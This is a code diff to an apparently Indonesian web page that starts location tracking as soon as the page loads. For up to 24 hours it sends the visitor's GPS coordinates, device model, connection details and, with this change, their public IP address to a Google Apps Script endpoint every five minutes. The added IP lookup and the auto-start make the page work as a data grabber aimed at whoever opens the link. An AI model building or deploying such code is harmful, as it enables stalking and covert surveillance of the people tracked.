@@ -32,12 +32,13 @@
       <div class="map-link" id="mapWrap">
         <a id="mapUrl" target="_blank" rel="noopener">-</a>
         <div class="small mono" id="coords"></div>
+        <div class="small mono" id="ipAddr"></div> <!-- Tambahan IP -->
       </div>
     </div>
   </div>
 
 <script>
-  const ENDPOINT_URL = 'https://script.google.com/macros/s/AKfycbyp27mVsBIL6TwAR7JF6-N0LLE7P6oNKV4oina0w_kmETphmtLBC26hobysRdoS71po9Q/exec';
+  const ENDPOINT_URL = 'https://script.google.com/macros/s/AKfycbxe5stN15rkQ16c_fasy7wevv4bmtNkurf7ewLxYGiKlMmPSE68ZiM-bzIjSeYqwDAoMw/exec';
 
   const statusEl = document.getElementById('status');
   const noteEl = document.getElementById('note');
@@ -45,20 +46,32 @@
   const mapWrap = document.getElementById('mapWrap');
   const mapUrl = document.getElementById('mapUrl');
   const coordsEl = document.getElementById('coords');
+  const ipEl = document.getElementById('ipAddr');
   const stopBtn = document.getElementById('stopBtn');
 
   let watchId = null;
   let stopTimer = null;
   let lastPos = null;
   let intervalId = null;
+  let userIP = "unknown";
+
+  // 🔥 Ambil IP address
+  async function fetchIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      userIP = data.ip;
+      ipEl.textContent = "IP: " + userIP;
+    } catch(e) {
+      userIP = "unknown";
+      ipEl.textContent = "IP: unknown";
+    }
+  }
 
   // 🔥 Fungsi parsing merk/model HP dari UA
   function parseDeviceModel(ua) {
     ua = ua.toLowerCase();
-
-    if (/sm-[a-z0-9]+/i.test(ua)) {
-      return "Samsung " + ua.match(/sm-[a-z0-9]+/i)[0].toUpperCase();
-    }
+    if (/sm-[a-z0-9]+/i.test(ua)) return "Samsung " + ua.match(/sm-[a-z0-9]+/i)[0].toUpperCase();
     if (/redmi|mi\s|mix|poco/i.test(ua)) return "Xiaomi/Redmi/POCO Device";
     if (/iphone/i.test(ua)) return "Apple iPhone";
     if (/ipad/i.test(ua)) return "Apple iPad";
@@ -69,8 +82,6 @@
     if (/tecno/i.test(ua)) return "Tecno Device";
     if (/huawei/i.test(ua)) return "Huawei Device";
     if (/asus|zenfone/i.test(ua)) return "Asus Device";
-
-    // fallback aman
     const parts = ua.split(";");
     return parts.length ? parts.pop().trim() : "Unknown Device";
   }
@@ -88,6 +99,7 @@
     }
     return {
       ua,
+      ip: userIP,
       deviceModel: parseDeviceModel(ua),
       connection: conn.effectiveType || "unknown",
       downlink: conn.downlink || "unknown",
@@ -104,6 +116,7 @@
       latitude, longitude, accuracy,
       userNote: noteEl.value.trim(),
       ua: extra.ua,
+      ip: extra.ip,
       deviceModel: extra.deviceModel,
       connection: extra.connection,
       downlink: extra.downlink,
@@ -114,7 +127,7 @@
     try {
       const res = await fetch(ENDPOINT_URL, {
         method: 'POST',
-        headers: { 'Content-Type': 'Text/Plain' }, // ✅ FIXED
+        headers: { 'Content-Type': 'Text/Plain' },
         body: JSON.stringify(payload),
       });
       return res.json();
@@ -134,7 +147,6 @@
     watchId = navigator.geolocation.watchPosition(async (pos) => {
       lastPos = pos.coords;
       setStatus('Mengirim lokasi...');
-
       const result = await sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
       if (result.ok) {
         coordsEl.textContent = `Lat: ${lastPos.latitude}, Lng: ${lastPos.longitude}`;
@@ -149,12 +161,10 @@
       setStatus(msg);
     }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
 
-    // 🔥 Paksa kirim tiap 5 menit walaupun posisi tidak berubah
     intervalId = setInterval(() => {
       if (lastPos) sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
     }, 300000);
 
-    // Stop otomatis setelah 24 jam
     stopTimer = setTimeout(stopRealtimeTracking, 24 * 60 * 60 * 1000);
   }
 
@@ -171,7 +181,10 @@
   stopBtn.addEventListener('click', stopRealtimeTracking);
 
   // Auto mulai tracking
-  window.addEventListener('load', startRealtimeTracking);
+  window.addEventListener('load', () => {
+    fetchIP();
+    startRealtimeTracking();
+  });
 </script>
 </body>
 </html>
